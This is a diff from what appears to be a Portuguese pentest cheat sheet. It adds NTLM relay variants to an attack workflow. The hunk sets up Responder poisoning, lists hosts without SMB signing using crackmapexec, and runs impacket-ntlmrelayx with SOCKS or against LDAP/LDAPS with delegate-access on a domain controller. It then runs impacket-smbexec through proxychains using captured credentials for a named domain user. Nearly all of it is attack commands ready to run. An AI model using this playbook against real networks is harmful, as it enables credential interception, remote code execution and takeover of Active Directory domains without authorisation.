@@ -3005,7 +3005,9 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
     sudo nano /etc/proxychains.conf ADICIONAR socks4 127.0.0.1 1080
     sudo nano /etc/responder/Responder.conf TROCAR SMB E HTTP para OFF
     crackmapexec smb 192.168.2.32/38 --gen-relay-list relay.txt AQUI NA LISTA CONTEM OS SERVERS COM SIGNIN FALSE
-    TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE
+    TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE && echo AQUI RODA O COMANDO socks PARA LISTAR SESSOES ATIVAS - OU
+	impacket-ntlmrelayx -t ldap://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo PODE USAR OUTROS PROTOCOLOS COMO LDAP - OU
+	impacket-ntlmrelayx -t ldaps://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo PODE USAR OUTROS PROTOCOLOS COMO LDAP
     TERMINAL 2 sudo responder -I eth2
     TERMINAL 3 proxychains impacket-smbexec -no-pass 'PRAIAS'/'LENITA'@'192.168.2.37' PRAIAS LENITA E O IP SAO IMPUTS CAPITURADOS DO RESPONDER E NTLMRELAY
 
